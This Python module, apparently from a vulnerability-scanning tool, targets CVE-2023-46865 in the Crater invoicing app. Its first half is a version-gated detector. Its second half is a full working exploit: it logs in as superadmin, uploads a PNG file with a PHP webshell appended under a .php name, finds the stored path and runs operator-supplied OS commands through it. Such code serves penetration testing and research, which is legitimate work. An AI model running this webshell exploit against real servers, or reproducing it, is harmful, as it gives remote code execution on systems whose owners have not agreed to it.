#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2023-46865')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2023-46865 — Crater <= 6.0.6 authenticated (superadmin) upload-logo code-injection RCE (SAFE DETECTOR).

Root cause (confirmed against the v6.0.6 source): POST /api/v1/company/upload-logo decodes a JSON
`company_logo` blob {"data":"data:image/png;base64,..","name":"x.php"} and passes the
attacker-controlled `name` straight to spatie/laravel-medialibrary's usingFileName() — the
CompanyLogoRequest only validates the base64 payload's MAGIC BYTES (Crater\\Rules\\Base64Mime), never
the filename extension. A PNG-magic'd payload named `<rand>.php` therefore lands web-served and
PHP-executable at /storage/{media_id}/<rand>.php. Fixed by validating the filename extension.

DETECTION DISCIPLINE (mirrors cve_2025_49132 — never fire on "the app exists"):
This is an AUTHENTICATED RCE, so the SAFE UNAUTH detector is app-fingerprint + version-gate, NOT
presence. We:
  1. Positively FINGERPRINT Crater from public surfaces — the /api/v1/ping bootstrap route (Crater's
     self-hosted ping), the SPA index HTML, and the /api/v1/app/version route — using DEFENSIVE
     substring/regex matching (we do NOT bet on an exact JSON shape; the source is git-cloned at lab
     build and its route bodies can't be verified in this code-only phase).
  2. Try to resolve the Crater VERSION. The version surface may be auth-gated post-install, so an
     unauth read is unreliable. If -U/-P are supplied we opportunistically log in (Sanctum) and read
     the authoritative version; otherwise we try the unauth /api/v1/app/version.
  3. vulnerable=True ONLY when a version is confidently parsed and is <= 6.0.6. If Crater is
     fingerprinted but the version is NOT resolvable, we set vulnerable=False /
     version_status="unknown" and say in evidence that exploit() is the confirmation (avoids the
     48987/49130 false-positive class).

scan() never requires auth to run; creds are used opportunistically and it degrades gracefully.
Exploitation half (the real upload + in-band command exec): modules/cves/cve_2023_46865.py.
"""

import re
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Last vulnerable Crater release — CVE-2023-46865 affects <= 6.0.6.
_MAX_VULN = (6, 0, 6)

# Public Crater bootstrap surfaces (unauthenticated). Bodies are matched DEFENSIVELY (substring /
# loose regex) — we don't hard-fail on an exact JSON shape we can't verify in this code-only phase.
_PING_EP = "/api/v1/ping"
_VERSION_EP = "/api/v1/app/version"
_LOGIN_EP = "/api/v1/auth/login"


def _get(session, url, **kw):
    try:
        allow_redirects = kw.pop("allow_redirects", True)
        return session.get(url, timeout=kw.pop("timeout", 10), verify=False,
                           allow_redirects=allow_redirects, **kw)
    except requests.RequestException:
        return None


def _parse_version(text):
    """Pull the version out of a body via the EXPLICIT "version": key only. Returns (M, m, p) or None.

    Deliberately strict: we do NOT scan for a bare dotted triple, because the large company-data docs
    (/api/v1/bootstrap, /api/v1/current-company) contain dates/money/dependency strings whose first
    triple would parse to a wrong version and could flip a vulnerable target to "patched" (a false
    negative). A real Crater version surface returns {"version":"6.0.6"}, so the explicit key suffices.
    """
    if not text:
        return None
    m = re.search(r'"version"\s*:\s*"v?(\d+)\.(\d+)\.(\d+)', text)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _is_crater_body(text):
    """Loose Crater fingerprint over a response body (case-insensitive substring)."""
    if not text:
        return False
    low = text.lower()
    return ("crater" in low) or ("crater-self-hosted" in low)


def _probe_storage_php_execution_control(session, base: str):
    """GET a guaranteed-missing PHP file under public storage.

    The vulnerable profile returns a normal not-found response. The hardened profile denies PHP under
    /storage before file lookup, which blocks the Crater upload-logo RCE even when version is unchanged.
    """
    r = _get(session, f"{base}/storage/lvc-control-probe.php", allow_redirects=False)
    if r is None:
        return {"blocked": False, "state": "unknown"}
    return {"blocked": r.status_code in (401, 403), "status": r.status_code}


def scan(target_url, *, session=None, username=None, password=None, **kwargs):
    operator_authed = session is not None
    sess = session or http_config.get_auth_session()
    base = target_url.rstrip("/")
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    s = sess
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2023-46865")

    result = {
        "cve_id": "CVE-2023-46865",
        "name": "Crater authenticated upload-logo code-injection RCE",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version_status": "unknown",
        "endpoint": base + "/api/v1/company/upload-logo",
        "evidence": [],
        "detection_methods": [],
        "artifacts": {},
    }

    # ------------------------------------------------------------------
    # 1) Fingerprint Crater (defensive — any one hit is sufficient).
    # ------------------------------------------------------------------
    fingerprinted = False

    ping = _get(s, f"{base}{_PING_EP}")
    if ping is not None and ping.status_code == 200 and _is_crater_body(ping.text):
        fingerprinted = True
        result["detection_methods"].append("ping_fingerprint")
        result["evidence"].append(f"{_PING_EP} responds with a Crater self-hosted ping body")

    # The Crater SPA index references its app name / asset bundle; loose match on the landing HTML.
    if not fingerprinted:
        root = _get(s, f"{base}/")
        if root is not None and root.status_code in (200, 302) and (
            _is_crater_body(root.text) or "crater" in (root.headers.get("Set-Cookie", "").lower())
        ):
            fingerprinted = True
            result["detection_methods"].append("spa_fingerprint")
            result["evidence"].append("landing page / cookies fingerprint as Crater")

    # ------------------------------------------------------------------
    # 2) Resolve the version. Prefer an authoritative authenticated read when -U/-P are supplied;
    #    otherwise try the (possibly auth-gated, unreliable) unauth version route.
    # ------------------------------------------------------------------
    version = None
    version_src = None

    ver_resp = _get(s, f"{base}{_VERSION_EP}")
    if ver_resp is not None and ver_resp.status_code == 200:
        version = _parse_version(ver_resp.text)
        if version:
            version_src = "unauth /api/v1/app/version"
            # The version route is itself a Crater-specific surface — count it as a fingerprint too.
            fingerprinted = True
            if "app_version_fingerprint" not in result["detection_methods"]:
                result["detection_methods"].append("app_version_fingerprint")

    # Opportunistic authenticated version read (Sanctum bearer) when creds are provided and the unauth
    # route didn't yield a version. Best-effort; never fatal, never required.
    if version is None and not operator_authed and username and password:
        token = _login(s, base, username, password)
        if token:
            fingerprinted = True
            result["detection_methods"].append("authenticated_login")
            h = {"Accept": "application/json", "Authorization": f"Bearer {token}", "company": "1"}
            for ep in (_VERSION_EP, "/api/v1/bootstrap", "/api/v1/current-company"):
                vr = _get(s, f"{base}{ep}", headers=h)
                if vr is not None and vr.status_code == 200:
                    if _is_crater_body(vr.text):
                        result["evidence"].append(f"authenticated {ep} confirms Crater")
                    v = _parse_version(vr.text)
                    if v:
                        version, version_src = v, f"authenticated {ep}"
                        break

    # ------------------------------------------------------------------
    # 3) Verdict — version-gate discipline.
    # ------------------------------------------------------------------
    if not fingerprinted:
        result["evidence"].append("no Crater fingerprint on public surfaces — not a Crater target")
        return result

    if version is not None:
        vs = ".".join(str(x) for x in version)
        result["evidence"].append(f"Crater version {vs} resolved via {version_src}")
        if version <= _MAX_VULN:
            control = _probe_storage_php_execution_control(s, base)
            result["artifacts"]["storage_php_control_probe"] = control
            result["detection_methods"].append("storage_php_control_probe")
            if control.get("blocked"):
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "upload_execution_control"
                result["version_status"] = "vulnerable version, storage PHP execution denied"
                result["evidence"].append(
                    "Crater version is in range, but PHP execution under public storage is denied")
                return result
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
            result["detection_methods"].append("version_gate")
            result["evidence"].append(
                f"version {vs} <= 6.0.6 — within CVE-2023-46865 affected range "
                "(authenticated superadmin upload-logo RCE); exploit() confirms in-band")
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["version_status"] = "patched"
            result["evidence"].append(f"version {vs} > 6.0.6 — outside affected range (patched)")
        return result

    # Fingerprinted but version not resolvable unauth: do NOT fire vulnerable=True on presence alone.
    result["version_status"] = "unknown"
    result["status"] = "surface_present"
    result["verdict"] = "surface_present"
    result["proof_type"] = "fingerprint"
    result["evidence"].append(
        "Crater fingerprinted but version not resolvable without auth (the version surface is "
        "commonly auth-gated post-install) — confidence is fingerprint-based; exploit() (authenticated "
        "upload-logo + /storage/{id}/*.php exec) is the confirmation")
    return result


def _login(session, base, username, password):
    """Best-effort Sanctum login (only when -U/-P supplied; non-fatal). Returns a Bearer token or None."""
    try:
        r = session.post(
            f"{base}{_LOGIN_EP}",
            json={"username": username, "password": password, "device_name": "scan"},
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            timeout=15, verify=False,
        )
    except requests.RequestException:
        return None
    if r is None or r.status_code != 200:
        return None
    try:
        return r.json().get("token")
    except (ValueError, requests.exceptions.JSONDecodeError):
        return None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2023-46865 exploitation half — Crater <= 6.0.6 authenticated (superadmin) upload-logo RCE.

Faithful port of the lab's live-verified PoC
(vuln-labs/apps/crater/6.0.6/cve-2023-46865_authed-upload-logo-rce_41011-42011/exploit.py), 4-step chain:

  1. POST /api/v1/auth/login {username,password,device_name}              -> Sanctum Bearer token
  2. POST /api/v1/company/upload-logo  (Authorization: Bearer, company: 1 header)
       body: {"company_logo": "<inner-json-string>"} where the inner string is
              {"data":"data:image/png;base64,<valid-PNG+PHP>","name":"<rand>.php"}
     CompanyLogoRequest validates ONLY the base64 payload's PNG magic bytes (Crater\\Rules\\Base64Mime);
     the attacker-controlled `name` is never validated -> stored verbatim as <rand>.php.
  3. GET /api/v1/current-company (Bearer + company:1) -> JSON exposes the logo media url, which reveals
     the planted path /storage/{media_id}/<rand>.php (fallback: /api/v1/bootstrap).
  4. GET /storage/{media_id}/<rand>.php?c=<command> -> the PHP webshell runs the command, output
     reflected in-band.

UPGRADE OVER THE PoC (per the cve_2024_21546 template): instead of the PoC's bare
`<?php system($_GET['c']); ?>` + a `uid=` heuristic, we wrap the webshell output in UNIQUE RANDOM
SENTINELS and extract the command output verbatim between them — clean past the leading PNG bytes
regardless of what the command prints. success=True ONLY on that observed in-band proof.

Detection half: modules/cves/cve_2023_46865.py.
"""

import base64
import json
import re
import secrets
import struct
import time
import urllib.parse
import zlib

import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_COMPANY_ID = "1"

_LOGIN_EP = "/api/v1/auth/login"
_UPLOAD_EP = "/api/v1/company/upload-logo"
# Routes whose JSON reveals the planted logo media url (-> /storage/{id}/<rand>.php).
_COMPANY_EPS = ("/api/v1/current-company", "/api/v1/bootstrap")


def _make_png_php(cmd_param, php_body):
    """A valid 1x1 PNG (libmagic -> 'png', passes Base64Mime) with a PHP webshell appended.

    Mirrors the PoC's struct/zlib PNG build; `php_body` is the webshell tail (sentinel-wrapped)."""
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00\xff\x00\x00")
    png = sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
    return png + php_body.encode()


def _walk_for_logo(node):
    """Recursively find a string value matching /storage/<id>/<name>.php in a decoded JSON doc."""
    if isinstance(node, str):
        if re.search(r"/storage/\d+/.+\.php$", node):
            return node
    elif isinstance(node, dict):
        for v in node.values():
            r = _walk_for_logo(v)
            if r:
                return r
    elif isinstance(node, list):
        for v in node:
            r = _walk_for_logo(v)
            if r:
                return r
    return None


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None):
    """Authenticated upload-logo code-injection -> in-band RCE. Never raises to the caller."""
    result = {
        "cve": "CVE-2023-46865",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    base = (target_url or "").rstrip("/")
    if not base:
        result.update(attempted=False, reason="no target_url provided")
        return result
    if not base.startswith(("http://", "https://")):
        base = "http://" + base

    operator_authed = session is not None
    cmd = command or "echo CVE-2023-46865 PoC && id && hostname"
    user = username
    pw = password
    timeout = 20

    s = session or http_config.get_auth_session()
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2023-46865")

    # ------------------------------------------------------------------
    # 1) Authenticate (Sanctum Bearer).
    # ------------------------------------------------------------------
    token = None
    if not operator_authed:
        if user is None or pw is None:
            result.update(
                requires=["valid Crater superadmin credentials"],
                reason="Crater exploit requires explicit credentials; pass both -U and -P",
                detail="authentication material not supplied",
            )
            return result

        if user and pw:
            try:
                r = s.post(f"{base}{_LOGIN_EP}",
                           json={"username": user, "password": pw, "device_name": "exploit"},
                           headers={"Content-Type": "application/json", "Accept": "application/json"},
                           timeout=timeout, verify=False)
            except requests.RequestException as e:
                result.update(reason=f"login request failed: {e}", requires=["network reachability"])
                return result
            if r.status_code != 200:
                result.update(
                    reason=f"login failed (HTTP {r.status_code}) — wrong creds or endpoint absent "
                           "(explicit credentials did not authenticate)",
                    requires=["valid Crater superadmin credentials"],
                    detail=(r.text or "")[:200],
                )
                return result
            try:
                token = r.json().get("token")
            except (ValueError, requests.exceptions.JSONDecodeError):
                token = None
            if not token:
                result.update(reason="login succeeded but no Sanctum token in response",
                              detail=(r.text or "")[:200])
                return result

    auth_headers = {"Content-Type": "application/json", "Accept": "application/json",
                    "company": _COMPANY_ID}
    if token:
        auth_headers["Authorization"] = f"Bearer {token}"

    # ------------------------------------------------------------------
    # 2) Upload the PNG+PHP polyglot named <rand>.php (the unvalidated filename is the bug).
    #    Webshell output is wrapped in unique sentinels for verbatim extraction (cve_2024_21546 idiom).
    # ------------------------------------------------------------------
    s_open = "LVSX46865_" + secrets.token_hex(4)
    s_close = secrets.token_hex(4) + "_46865LVSX"
    php_shell = (
        f"<?php echo '{s_open}'; "
        f"system(isset($_GET['c']) ? $_GET['c'] : {_php_str(cmd)}); "
        f"echo '{s_close}'; ?>"
    )
    payload = _make_png_php("c", php_shell)
    data_uri = "data:image/png;base64," + base64.b64encode(payload).decode()
    name = f"logo_{int(time.time())}_{secrets.token_hex(3)}.php"  # fresh name each run (no stale-shell FP)
    inner = json.dumps({"data": data_uri, "name": name})
    upload_body = json.dumps({"company_logo": inner}).encode()

    try:
        up = s.post(f"{base}{_UPLOAD_EP}", data=upload_body, headers=auth_headers,
                    timeout=timeout, verify=False)
    except requests.RequestException as e:
        result.update(reason=f"upload-logo request failed: {e}")
        return result
    if up.status_code == 422:
        result.update(
            reason="upload-logo rejected with HTTP 422 — filename validated (PATCHED: the fix "
                   "validates the attacker-controlled `name` extension)",
            detail=(up.text or "")[:200],
            artifacts={"upload_status": 422},
        )
        return result
    if up.status_code != 200:
        result.update(
            reason=f"upload-logo returned HTTP {up.status_code} (expected 200) — endpoint absent or "
                   "authorization denied (manage-company policy)",
            detail=(up.text or "")[:200],
            artifacts={"upload_status": up.status_code},
        )
        return result

    # ------------------------------------------------------------------
    # 3) Resolve the planted /storage/{media_id}/<rand>.php path from the company JSON.
    # ------------------------------------------------------------------
    path = None
    read_headers = {"Accept": "application/json", "company": _COMPANY_ID}
    if token:
        read_headers["Authorization"] = f"Bearer {token}"
    for ep in _COMPANY_EPS:
        try:
            cr = s.get(f"{base}{ep}", headers=read_headers, timeout=timeout, verify=False)
        except requests.RequestException:
            continue
        if cr.status_code != 200:
            continue
        body = cr.text or ""
        # Structured: walk the JSON for the logo media url.
        try:
            hit = _walk_for_logo(cr.json())
        except (ValueError, requests.exceptions.JSONDecodeError):
            hit = None
        if hit:
            path = urllib.parse.urlparse(hit).path if hit.startswith("http") else hit
            break
        # Fallback: regex on the slash-unescaped text (Crater json_encode escapes slashes).
        m = re.search(r"/storage/\d+/[^\"\\\s]+?\.php", body.replace("\\/", "/"))
        if m:
            path = m.group(0)
            break

    if not path:
        result.update(
            reason="upload accepted (HTTP 200) but the planted /storage/{id}/*.php path could not be "
                   "resolved from the company JSON (media layout differs / not exposed)",
            artifacts={"upload_status": 200, "uploaded_as": name},
        )
        return result

    # ------------------------------------------------------------------
    # 4) Execute: GET the planted PHP with ?c=<cmd> and extract output between the sentinels.
    # ------------------------------------------------------------------
    webshell_url = f"{base}{path}"
    try:
        ex = s.get(webshell_url, params={"c": cmd}, timeout=timeout, verify=False)
    except requests.RequestException as e:
        result.update(reason=f"webshell GET failed: {e}",
                      artifacts={"webshell_url": webshell_url, "uploaded_as": name})
        return result

    text = ex.text or ""
    if ex.status_code == 200 and s_open in text and s_close in text:
        out = text.split(s_open, 1)[1].split(s_close, 1)[0].strip()
        result.update(
            success=True,
            evidence=out if out else "(command produced no stdout, but webshell executed)",
            detail=f"RCE via Crater upload-logo filename code-injection; '{cmd}' executed at {webshell_url}",
            artifacts={
                "webshell_url": webshell_url,
                "upload_endpoint": f"{base}{_UPLOAD_EP}",
                "uploaded_as": name,
                "command": cmd,
                "marker": f"{s_open}...{s_close}",
            },
            outcome_tag="rce-confirmed",
            impact=("Authenticated superadmin uploaded a PNG-magic'd .php webshell via upload-logo "
                    "(unvalidated filename) and executed OS commands in-band as the FPM user."),
        )
        return result

    # Planted but no in-band output — explain honestly.
    result.update(
        reason=f"planted PHP at {path} but no in-band command output (HTTP {ex.status_code}; the file "
               "may not be PHP-executable under /storage, or the shell did not run)",
        artifacts={"webshell_url": webshell_url, "uploaded_as": name,
                   "command": cmd, "fetch_status": ex.status_code},
        detail="upload landed but code execution not confirmed",
    )
    return result


def _php_str(s):
    """Embed the default command as a single-quoted PHP string literal."""
    return "'" + str(s).replace("\\", "\\\\").replace("'", "\\'") + "'"
